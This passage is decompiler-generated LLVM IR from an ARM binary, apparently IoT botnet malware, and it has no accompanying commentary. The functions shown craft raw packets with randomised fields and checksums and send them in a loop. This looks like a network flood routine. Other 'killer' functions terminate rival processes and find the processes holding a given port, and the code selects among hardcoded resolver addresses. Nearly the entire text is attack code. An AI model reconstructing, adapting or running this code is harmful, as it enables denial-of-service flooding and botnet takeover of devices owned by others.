  store i32 %v4_db74.pre-phi, i32* %r1.global-to-local, align 4
  %v2_db78 = inttoptr i32 %v1_db70 to i8*
  %v3_db78 = call i32 @rand_alphastr(i8* %v2_db78, i32 %v4_db74.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_db80 = load i32, i32* @r4, align 4
  %v3_db80 = add i32 %v2_db80, 10
  %v4_db80 = inttoptr i32 %v3_db80 to i16*
  store i16 0, i16* %v4_db80, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_db88 = load i32, i32* @r4, align 4
  store i32 %v0_db88, i32* @r0, align 4
  %v2_db8c = call i32 @checksum_generic(i32 %v0_db88, i32 20)
  %v3_db8c = trunc i32 %v2_db8c to i16
  store i32 %v2_db8c, i32* %r0.global-to-local, align 4
  %v3_db90 = load i32, i32* @r4, align 4
  %v4_db90 = add i32 %v3_db90, 10
  %v5_db90 = inttoptr i32 %v4_db90 to i16*
  store i16 %v3_db8c, i16* %v5_db90, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_db98 = load i32, i32* @r6, align 4
  %v3_db98 = add i32 %v2_db98, 6
  %v4_db98 = inttoptr i32 %v3_db98 to i16*
  store i16 0, i16* %v4_db98, align 2
  %v0_db9c = load i32, i32* @r6, align 4
  store i32 %v0_db9c, i32* @r1, align 4
  %v1_dba0 = add i32 %v0_db9c, 4
  %v2_dba0 = inttoptr i32 %v1_dba0 to i16*
  %v3_dba0 = load i16, i16* %v2_dba0, align 2
  %v4_dba0 = zext i16 %v3_dba0 to i32
  store i32 %v4_dba0, i32* %r2.global-to-local, align 4
  %v0_dba4 = load i32, i32* @sb, align 4
  store i32 %v0_dba4, i32* %r3.global-to-local, align 4
  %v0_dba8 = load i32, i32* @r4, align 4
  store i32 %v0_dba8, i32* %r0.global-to-local, align 4
  %v4_dbac = call i32 @checksum_tcpudp(i32 %v0_dba8, i32 %v0_db9c, i32 %v4_dba0, i32 %v0_dba4)
  %v5_dbac = trunc i32 %v4_dbac to i16
  store i32 %v4_dbac, i32* %r0.global-to-local, align 4
  %v3_dbb0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_dbb0, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_dbb8 = mul i32 %v3_dbb0, 32
  store i32 %v3_dbb8, i32* %ip.global-to-local, align 4
  %v3_dbbc = load i32, i32* @r6, align 4
  %v4_dbbc = add i32 %v3_dbbc, 6
  %v5_dbbc = inttoptr i32 %v4_dbbc to i16*
  store i16 %v5_dbac, i16* %v5_dbbc, align 2
  %v0_dbc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_dbc0 = load i32, i32* %r3.global-to-local, align 4
  %tmp133 = mul i32 %v1_dbc0, -8
  %v5_dbc0 = add i32 %v0_dbc0, %tmp133
  store i32 %v5_dbc0, i32* %ip.global-to-local, align 4
  %v0_dbc4 = load i32, i32* @r6, align 4
  %v1_dbc4 = add i32 %v0_dbc4, 2
  %v2_dbc4 = inttoptr i32 %v1_dbc4 to i16*
  %v3_dbc4 = load i16, i16* %v2_dbc4, align 2
  %v4_dbc4 = zext i16 %v3_dbc4 to i32
  store i32 %v4_dbc4, i32* @r6, align 4
  %v1_dbc8 = load i32, i32* @lr, align 4
  %v2_dbc8 = add i32 %v1_dbc8, %v5_dbc0
  store i32 %v2_dbc8, i32* %ip.global-to-local, align 4
  %v3_dbcc = add i32 %v2_dbc8, 2
  %v4_dbcc = inttoptr i32 %v3_dbcc to i16*
  store i16 %v3_dbc4, i16* %v4_dbcc, align 2
  %v0_dbd0 = load i32, i32* @fp, align 4
  %v1_dbd0 = load i32, i32* %ip.global-to-local, align 4
  %v2_dbd0 = add i32 %v1_dbd0, 4
  %v3_dbd0 = inttoptr i32 %v2_dbd0 to i32*
  store i32 %v0_dbd0, i32* %v3_dbd0, align 4
  %v0_dbd4 = load i32, i32* @r4, align 4
  store i32 %v0_dbd4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_d888, i32* %r0.global-to-local, align 4
  %v0_dbe0 = load i32, i32* @sl, align 4
  store i32 %v0_dbe0, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_dbe8 = load i32, i32* %ip.global-to-local, align 4
  %v6_dbf0 = call i32 @__libc_sendto(i32 %v3_d888, i32 %v0_dbd4, i32 %v0_dbe0, i32 16384, i32 %v0_dbe8, i32 16)
  %v3_dbf4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_dbf4, i32* %r3.global-to-local, align 4
  %v1_dbf8 = add i32 %v3_dbf4, 1
  store i32 %v1_dbf8, i32* %r0.global-to-local, align 4
  %v0_dbfc = load i32, i32* @r8, align 4
  %v9_dbfc = icmp eq i32 %v0_dbfc, %v1_dbf8
  store i1 %v9_dbfc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_dbf8, i32* %stack_var_-44, align 4
  %v8_dc04 = icmp sgt i32 %v0_dbfc, %v1_dbf8
  br i1 %v8_dc04, label %dec_label_pc_db2c, label %dec_label_pc_dc08

dec_label_pc_dc08:                                ; preds = %dec_label_pc_db70
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_dc0c = icmp eq i32 %v0_dbfc, 0
  store i1 %v2_dc0c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_dc0c, label %dec_label_pc_db10, label %dec_label_pc_db20

dec_label_pc_dc1c:                                ; preds = %dec_label_pc_db2c
  %v0_dc1c = call i32 @rand_next()
  %v1_dc1c = trunc i32 %v0_dc1c to i16
  store i32 %v0_dc1c, i32* %r0.global-to-local, align 4
  store i32 %v3_d8ec, i32* @lr, align 4
  %v1_dc24 = load i32, i32* @r5, align 4
  %v9_dc24 = icmp eq i32 %v3_d8ec, %v1_dc24
  store i1 %v9_dc24, i1* %cpsr_z.global-to-local, align 1
  %v3_dc28 = load i32, i32* @r4, align 4
  %v4_dc28 = add i32 %v3_dc28, 4
  %v5_dc28 = inttoptr i32 %v4_dc28 to i16*
  store i16 %v1_dc1c, i16* %v5_dc28, align 2
  br i1 %v9_dc24, label %dec_label_pc_dc30, label %dec_label_pc_dc1c.dec_label_pc_db58_crit_edge

dec_label_pc_dc1c.dec_label_pc_db58_crit_edge:    ; preds = %dec_label_pc_dc1c
  %v1_db5c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_db58

dec_label_pc_dc30:                                ; preds = %dec_label_pc_dc1c, %dec_label_pc_db4c
  %v0_dc30 = call i32 @rand_next()
  %v1_dc30 = trunc i32 %v0_dc30 to i16
  %v3_dc34 = load i32, i32* @r4, align 4
  %v4_dc34 = add i32 %v3_dc34, 20
  %v5_dc34 = inttoptr i32 %v4_dc34 to i16*
  store i16 %v1_dc30, i16* %v5_dc34, align 2
  store i32 %v3_d908, i32* %r0.global-to-local, align 4
  %v1_dc3c = load i32, i32* @r5, align 4
  %v9_dc3c = icmp eq i32 %v3_d908, %v1_dc3c
  store i1 %v9_dc3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dc3c, label %dec_label_pc_dc44, label %dec_label_pc_db64

dec_label_pc_dc44:                                ; preds = %dec_label_pc_dc30, %dec_label_pc_db58
  %v0_dc44 = call i32 @rand_next()
  %v1_dc44 = trunc i32 %v0_dc44 to i16
  store i32 %v0_dc44, i32* %r0.global-to-local, align 4
  store i32 %v3_d910, i32* %r2.global-to-local, align 4
  %v1_dc4c = load i32, i32* @r5, align 4
  %v9_dc4c = icmp eq i32 %v3_d910, %v1_dc4c
  store i1 %v9_dc4c, i1* %cpsr_z.global-to-local, align 1
  %v3_dc50 = load i32, i32* @r6, align 4
  %v4_dc50 = add i32 %v3_dc50, 2
  %v5_dc50 = inttoptr i32 %v4_dc50 to i16*
  store i16 %v1_dc44, i16* %v5_dc50, align 2
  br i1 %v9_dc4c, label %dec_label_pc_dc58, label %dec_label_pc_db70

dec_label_pc_dc58:                                ; preds = %dec_label_pc_dc44, %dec_label_pc_db64
  %v0_dc58 = call i32 @rand_next()
  %v1_dc58 = trunc i32 %v0_dc58 to i16
  store i32 %v0_dc58, i32* %r0.global-to-local, align 4
  %v3_dc5c = load i32, i32* @r4, align 4
  %v4_dc5c = add i32 %v3_dc5c, 28
  %v5_dc5c = inttoptr i32 %v4_dc5c to i16*
  store i16 %v1_dc58, i16* %v5_dc5c, align 2
  br label %dec_label_pc_db70

dec_label_pc_dc64:                                ; preds = %dec_label_pc_d7ec, %dec_label_pc_d7cc, %dec_label_pc_d770, %entry
  %v0_dc64 = call i32 @rand_next()
  %v1_dc68 = urem i32 %v0_dc64, 4
  store i32 %v1_dc68, i32* %r0.global-to-local, align 4
  %v2_dc6c = icmp eq i32 %v1_dc68, 3
  store i1 %v2_dc6c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_dc64 to i2
  switch i2 %trunc, label %dec_label_pc_d86811 [
    i2 0, label %dec_label_pc_dcc4
    i2 1, label %dec_label_pc_dcbc
    i2 -2, label %dec_label_pc_dcb0
    i2 -1, label %dec_label_pc_dca0
  ]

dec_label_pc_dc88:                                ; preds = %dec_label_pc_d898
  store i32 %v3_d888, i32* %r0.global-to-local, align 4
  %v1_dc8c = call i32 @__GI___libc_close(i32 %v3_d888)
  store i32 %v1_dc8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dc90

dec_label_pc_dc90:                                ; preds = %dec_label_pc_d870, %dec_label_pc_d868, %dec_label_pc_dc88
  %v1_dc9c = phi i32 [ %v3_d888, %dec_label_pc_d870 ], [ %v1_dc9c50, %dec_label_pc_d868 ], [ %v1_dc8c, %dec_label_pc_dc88 ]
  store i32 %v18_d61c, i32* %sb.global-to-local, align 4
  store i32 %v27_d61c, i32* %lr.global-to-local, align 4
  ret i32 %v1_dc9c

dec_label_pc_dca0:                                ; preds = %dec_label_pc_dc64
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_d868

dec_label_pc_dcb0:                                ; preds = %dec_label_pc_dc64
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_d868

dec_label_pc_dcbc:                                ; preds = %dec_label_pc_dc64
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_d868

dec_label_pc_dcc4:                                ; preds = %dec_label_pc_dc64
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_d868

; uselistorder directives
  uselistorder i32 %v1_dc68, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_dc64, { 1, 0 }
  uselistorder i32 %v0_dc58, { 1, 0 }
  uselistorder i32 %v0_dc44, { 1, 0 }
  uselistorder i32 %v1_dc3c, { 1, 0 }
  uselistorder i32 %v0_dc1c, { 1, 0 }
  uselistorder i32 %v1_dbf8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_dbc0, { 1, 0 }
  uselistorder i32 %v4_dbac, { 1, 0 }
  uselistorder i32 %v2_db8c, { 1, 0 }
  uselistorder i1 %v3_db50, { 1, 0 }
  uselistorder i1 %v3_db40, { 1, 0 }
  uselistorder i32 %v4_db74.pre-phi, { 1, 0 }
  uselistorder i32 %v1_dae8, { 1, 0, 2 }
  uselistorder i32 %v0_dad8, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_dac4, { 2, 0, 3, 1 }
  uselistorder i32 %v0_dac0, { 1, 0, 2 }
  uselistorder i32 %v0_da30, { 1, 0 }
  uselistorder i32 %v4_da2c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp112, { 1, 0 }
  uselistorder i32 %v3_d978, { 1, 0 }
  uselistorder i32 %v3_d934, { 1, 0 }
  uselistorder i32 %v1_d928, { 2, 0, 1 }
  uselistorder i32 %v3_d8f4, { 1, 0 }
  uselistorder i32 %v3_d8ec, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_d8e4, { 0, 2, 1 }
  uselistorder i8 %v5_d8dc, { 1, 0, 2 }
  uselistorder i32 %v1_d8c8, { 1, 0 }
  uselistorder i32 %v0_d8c8, { 1, 0 }
  uselistorder i1 %v7_d8b8, { 1, 0 }
  uselistorder i1 %v7_d88c, { 1, 0 }
  uselistorder i32 %v3_d888, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_d868, { 1, 0, 2 }
  uselistorder i32 %v2_d838, { 0, 1, 3, 2 }
  uselistorder i32 %v2_d834, { 1, 0, 2 }
  uselistorder i1 %v7_d820, { 1, 0 }
  uselistorder i32 %v1_d81c, { 1, 0, 2 }
  uselistorder i1 %v8_d814, { 1, 0 }
  uselistorder i1 %v7_d810, { 1, 0 }
  uselistorder i32 %v1_d804, { 1, 0 }
  uselistorder i8 %v2_d7f8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_d7fc, { 1, 0 }
  uselistorder i32 %v0_d81c, { 3, 0, 2, 1 }
  uselistorder i32 %v0_d7ec, { 0, 2, 1 }
  uselistorder i32 %v1_d800, { 0, 2, 1 }
  uselistorder i32 %v2_d7d4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d7cc, { 1, 0, 2, 3 }
  uselistorder i1 %v7_d7c4, { 1, 0 }
  uselistorder i32 %v0_d7c4, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 %v0_d768, { 1, 0, 3, 2 }
  uselistorder i32 %v6_d708, { 1, 0, 2, 3 }
  uselistorder i32 %v6_d6ec, { 1, 0, 2, 3 }
  uselistorder i32 %v6_d6d4, { 2, 1, 0 }
  uselistorder i32 %v1_d6bc, { 1, 0 }
  uselistorder i32 %v7_d678, { 1, 0, 2 }
  uselistorder i32 %v2_d63c, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %sb.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 35, 36, 37, 41, 38, 42, 39, 40, 11, 12, 13, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 29, 28, 30, 32, 31, 34, 33, 0 }
  uselistorder i32* %r0.global-to-local, { 38, 36, 37, 39, 41, 40, 43, 42, 44, 46, 45, 47, 48, 49, 51, 50, 53, 52, 54, 55, 56, 58, 57, 1, 2, 3, 7, 4, 5, 6, 8, 10, 9, 11, 12, 13, 14, 16, 15, 17, 18, 20, 19, 21, 23, 22, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 16, 17, 18, 19, 20, 21, 22, 0, 24, 23, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i1* %cpsr_z.global-to-local, { 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 2, 3, 4, 5, 7, 8, 10, 11, 12, 9, 6, 13, 14, 15 }
  uselistorder i16 64, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 41, { 4, 5, 6, 0, 2, 7, 1, 8, 3, 9 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dc90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_db70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_db20, { 1, 0 }
  uselistorder label %dec_label_pc_db10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_db10.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_dae0, { 1, 0 }
  uselistorder label %.thread20, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %dec_label_pc_d830, { 1, 0 }
  uselistorder label %dec_label_pc_d820, { 1, 0 }
  uselistorder label %dec_label_pc_d7ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d7e4, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_dd00, label %dec_label_pc_dce8

dec_label_pc_dce8:                                ; preds = %entry
  %v0_dcf0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_dcec

dec_label_pc_dcec:                                ; preds = %dec_label_pc_dcec, %dec_label_pc_dce8
  %v0_dcf8 = phi i32 [ %v2_dcf8, %dec_label_pc_dcec ], [ 0, %dec_label_pc_dce8 ]
  %v0_dcf0 = phi i32 [ %v5_dcf0, %dec_label_pc_dcec ], [ %v0_dcf0.pre, %dec_label_pc_dce8 ]
  %v0_dcec = phi i32 [ %v1_dcec, %dec_label_pc_dcec ], [ %arg1, %dec_label_pc_dce8 ]
  %v1_dcec = add i32 %v0_dcec, -2
  %v1_dcf0 = inttoptr i32 %v0_dcf0 to i16*
  %v2_dcf0 = load i16, i16* %v1_dcf0, align 2
  %v3_dcf0 = zext i16 %v2_dcf0 to i32
  %v5_dcf0 = add i32 %v0_dcf0, -2
  store i32 %v5_dcf0, i32* @r0, align 4
  %v2_dcf8 = add i32 %v3_dcf0, %v0_dcf8
  %v1_dcec.cmp = icmp ugt i32 %v1_dcec, 1
  br i1 %v1_dcec.cmp, label %dec_label_pc_dcec, label %dec_label_pc_dd00.loopexit

dec_label_pc_dd00.loopexit:                       ; preds = %dec_label_pc_dcec
  br label %dec_label_pc_dd00

dec_label_pc_dd00:                                ; preds = %entry, %dec_label_pc_dd00.loopexit
  %v1_dd08 = phi i32 [ %v2_dcf8, %dec_label_pc_dd00.loopexit ], [ 0, %entry ]
  %v0_dd00 = phi i32 [ %v1_dcec, %dec_label_pc_dd00.loopexit ], [ %arg1, %entry ]
  %v7_dd00 = icmp eq i32 %v0_dd00, 1
  br i1 %v7_dd00, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_dd00
  %v1_dd04 = load i32, i32* @r0, align 4
  %v2_dd04 = inttoptr i32 %v1_dd04 to i8*
  %v3_dd04 = load i8, i8* %v2_dd04, align 1
  %v4_dd04 = zext i8 %v3_dd04 to i32
  %v3_dd08 = add i32 %v1_dd08, %v4_dd04
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_dd00, %bb
  %v0_dd0c = phi i32 [ %v1_dd08, %dec_label_pc_dd00 ], [ %v3_dd08, %bb ]
  %v3_dd10 = urem i32 %v0_dd0c, 65536
  %v4_dd14 = udiv i32 %v0_dd0c, 65536
  %v5_dd14 = add nuw nsw i32 %v4_dd14, %v3_dd10
  %v4_dd18 = udiv i32 %v5_dd14, 65536
  %v5_dd18 = add nuw nsw i32 %v4_dd18, %v5_dd14
  %v1_dd1c = urem i32 %v5_dd18, 65536
  %v3_dd24 = xor i32 %v1_dd1c, 65535
  ret i32 %v3_dd24

; uselistorder directives
  uselistorder i32 %v5_dd14, { 1, 0 }
  uselistorder i32 %v5_dcf0, { 1, 0 }
  uselistorder i32 %v1_dcec, { 1, 0, 2 }
  uselistorder i32 %v0_dcf0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_dd00, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_dd3c = add i32 %arg1, 12
  %v2_dd3c = inttoptr i32 %v1_dd3c to i32*
  %v3_dd3c = load i32, i32* %v2_dd3c, align 4
  %v1_dd40 = add i32 %arg1, 16
  %v2_dd40 = inttoptr i32 %v1_dd40 to i32*
  %v3_dd40 = load i32, i32* %v2_dd40, align 4
  %v7_dd44 = icmp sgt i32 %arg3, 1
  br i1 %v7_dd44, label %dec_label_pc_dd50.preheader, label %dec_label_pc_dd64

dec_label_pc_dd50.preheader:                      ; preds = %entry
  %v0_dd54.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_dd50

dec_label_pc_dd50:                                ; preds = %dec_label_pc_dd50.preheader, %dec_label_pc_dd50
  %v0_dd5c = phi i32 [ 0, %dec_label_pc_dd50.preheader ], [ %v2_dd5c, %dec_label_pc_dd50 ]
  %v0_dd54 = phi i32 [ %v0_dd54.pre, %dec_label_pc_dd50.preheader ], [ %v5_dd54, %dec_label_pc_dd50 ]
  %v0_dd50 = phi i32 [ %arg3, %dec_label_pc_dd50.preheader ], [ %v1_dd50, %dec_label_pc_dd50 ]
  %v1_dd50 = add nsw i32 %v0_dd50, -2
  %v1_dd54 = inttoptr i32 %v0_dd54 to i16*
  %v2_dd54 = load i16, i16* %v1_dd54, align 2
  %v3_dd54 = zext i16 %v2_dd54 to i32
  %v5_dd54 = add i32 %v0_dd54, -2
  store i32 %v5_dd54, i32* @r1, align 4
  %v2_dd5c = add i32 %v3_dd54, %v0_dd5c
  %v8_dd60 = icmp sgt i32 %v1_dd50, 1
  br i1 %v8_dd60, label %dec_label_pc_dd50, label %dec_label_pc_dd64.loopexit

dec_label_pc_dd64.loopexit:                       ; preds = %dec_label_pc_dd50
  br label %dec_label_pc_dd64

dec_label_pc_dd64:                                ; preds = %dec_label_pc_dd64.loopexit, %entry
  %v1_dd70 = phi i32 [ %v2_dd5c, %dec_label_pc_dd64.loopexit ], [ 0, %entry ]
  %v0_dd64 = phi i32 [ %v1_dd50, %dec_label_pc_dd64.loopexit ], [ %arg3, %entry ]
  %v7_dd64 = icmp eq i32 %v0_dd64, 1
  br i1 %v7_dd64, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_dd64
  br label %bb19

bb:                                               ; preds = %dec_label_pc_dd64
  %v1_dd68 = load i32, i32* @r1, align 4
  %v2_dd68 = inttoptr i32 %v1_dd68 to i8*
  %v3_dd68 = load i8, i8* %v2_dd68, align 1
  %v4_dd68 = zext i8 %v3_dd68 to i32
  %v3_dd70 = add i32 %v4_dd68, %v1_dd70
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_dd98 = phi i32 [ %v1_dd70, %.thread ], [ %v3_dd70, %bb ]
  %v0_dd78 = mul i32 %v3_dd3c, 65536
  %v3_dd78 = udiv i32 %v0_dd78, 65536
  %v3_dd7c = urem i32 %v3_dd40, 65536
  %v4_dd84 = udiv i32 %v3_dd3c, 65536
  %v2_dd80 = add nuw nsw i32 %v3_dd7c, %v4_dd84
  %v5_dd84 = add nuw nsw i32 %v2_dd80, %v3_dd78
  %v1_dd88 = add i32 %arg1, 9
  %v2_dd88 = inttoptr i32 %v1_dd88 to i8*
  %v3_dd88 = load i8, i8* %v2_dd88, align 1
  %v4_dd88 = zext i8 %v3_dd88 to i32
  %v4_dd8c = udiv i32 %v3_dd40, 65536
  %v3_dd94 = mul nuw nsw i32 %v4_dd88, 256
  %v5_dd8c = add i32 %v4_dd8c, %arg2
  %v2_dd90 = add i32 %v5_dd8c, %v1_dd98
  %v2_dd98 = add i32 %v2_dd90, %v5_dd84
  %v2_dd9c = add i32 %v2_dd98, %v3_dd94
  %tmp = icmp ult i32 %v2_dd9c, 65536
  br i1 %tmp, label %dec_label_pc_ddbc, label %dec_label_pc_dda8

dec_label_pc_dda8:                                ; preds = %bb19, %dec_label_pc_dda8
  %v2_ddb05 = phi i32 [ %v2_ddb0, %dec_label_pc_dda8 ], [ %v2_dd9c, %bb19 ]
  %v3_ddb46.in = phi i32 [ %v2_ddb0, %dec_label_pc_dda8 ], [ %v2_dd9c, %bb19 ]
  %v3_ddb46 = udiv i32 %v3_ddb46.in, 65536
  %v3_ddac = urem i32 %v2_ddb05, 65536
  %v2_ddb0 = add nuw nsw i32 %v3_ddac, %v3_ddb46
  %tmp20 = icmp ult i32 %v2_ddb0, 65536
  br i1 %tmp20, label %dec_label_pc_ddbc.loopexit, label %dec_label_pc_dda8

dec_label_pc_ddbc.loopexit:                       ; preds = %dec_label_pc_dda8
  br label %dec_label_pc_ddbc

dec_label_pc_ddbc:                                ; preds = %dec_label_pc_ddbc.loopexit, %bb19
  %v0_ddbc = phi i32 [ %v2_ddb0, %dec_label_pc_ddbc.loopexit ], [ %v2_dd9c, %bb19 ]
  %v1_ddbc = urem i32 %v0_ddbc, 65536
  %v3_ddc4 = xor i32 %v1_ddbc, 65535
  ret i32 %v3_ddc4

; uselistorder directives
  uselistorder i32 %v2_ddb0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_dd9c, { 3, 0, 2, 1 }
  uselistorder i32 %v1_dd70, { 1, 0 }
  uselistorder i32 %v5_dd54, { 1, 0 }
  uselistorder i32 %v0_dd54, { 1, 0 }
  uselistorder i32 %v3_dd3c, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_dda8, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_dd50, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_dddc = load i32, i32* @global_var_26e58.112, align 4
  %v2_dde4 = call i32 @kill(i32 %v2_dddc, i32 9)
  ret i32 %v2_dde4
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_ddf8 = load i32, i32* @r4, align 4
  %v6_ddf8 = load i32, i32* @r5, align 4
  %v9_ddf8 = load i32, i32* @r6, align 4
  %v12_ddf8 = load i32, i32* @r7, align 4
  %v15_ddf8 = load i32, i32* @r8, align 4
  %v18_ddf8 = load i32, i32* @sb, align 4
  %v21_ddf8 = load i32, i32* @sl, align 4
  %v24_ddf8 = load i32, i32* @fp, align 4
  %v27_ddf8 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_de14 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_de14, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_de40 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_de40, i32* @fp, align 4
  %v4_de4c = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_de50 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_de50, i32* @sl, align 4
  %v0_de54 = load i32, i32* @r5, align 4
  %v3_de60 = bitcast i32* %stack_var_-8777 to i8*
  %v4_de60 = call i32 @__GI_memset(i8* %v3_de60, i32 %v0_de54, i32 4096)
  %v0_de68 = load i32, i32* @r5, align 4
  %v3_de74 = bitcast i32* %stack_var_-4681 to i8*
  %v4_de74 = call i32 @__GI_memset(i8* %v3_de74, i32 %v0_de68, i32 4096)
  %v2_de78 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_de78, i32* @sb, align 4
  %v0_de7c = load i32, i32* %r4.global-to-local, align 4
  %v3_de7c = udiv i32 %v0_de7c, 256
  %v1_de80 = urem i32 %v0_de7c, 256
  store i32 %v1_de80, i32* @r4, align 4
  %v3_de90 = trunc i32 %v3_de7c to i8
  %v4_de90 = call i32 @util_itoa(i8 %v3_de90, i32 16, i32 %v2_de78)
  %v2_de98 = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_de9c = icmp eq i32 %v2_de98, 2
  br i1 %v7_de9c, label %dec_label_pc_e330, label %dec_label_pc_dea4

dec_label_pc_dea4:                                ; preds = %entry, %dec_label_pc_e330
  %v1_dea8 = call i32 @table_unlock_val(i32 6)
  %v1_deb0 = call i32 @table_unlock_val(i32 7)
  %v1_deb8 = call i32 @table_unlock_val(i32 9)
  %v0_dec0 = load i32, i32* @r5, align 4
  %v3_dec4 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_1b42c.114 to i32), i32 %v0_dec0)
  %v7_dec8 = icmp eq i32 %v3_dec4, -1
  store i32 %v3_dec4, i32* @r8, align 4
  br i1 %v7_dec8, label %bb, label %dec_label_pc_ded8.preheader

bb:                                               ; preds = %dec_label_pc_dea4
  %v1_ded0 = load i32, i32* @r5, align 4
  store i32 %v1_ded0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e2f0

dec_label_pc_ded8.preheader:                      ; preds = %dec_label_pc_dea4
  %v4_dee457 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v3_dec4)
  %v2_dee859 = icmp eq i32 %v4_dee457, 0
  br i1 %v2_dee859, label %dec_label_pc_e070.loopexit, label %dec_label_pc_def0.lr.ph

dec_label_pc_def0.lr.ph:                          ; preds = %dec_label_pc_ded8.preheader
  %v2_df38 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_def0

dec_label_pc_def0:                                ; preds = %dec_label_pc_def0.lr.ph, %dec_label_pc_ded8.backedge
  %v3_def4 = load i8, i8* %stack_var_-585, align 1
  %v4_def4 = sext i8 %v3_def4 to i32
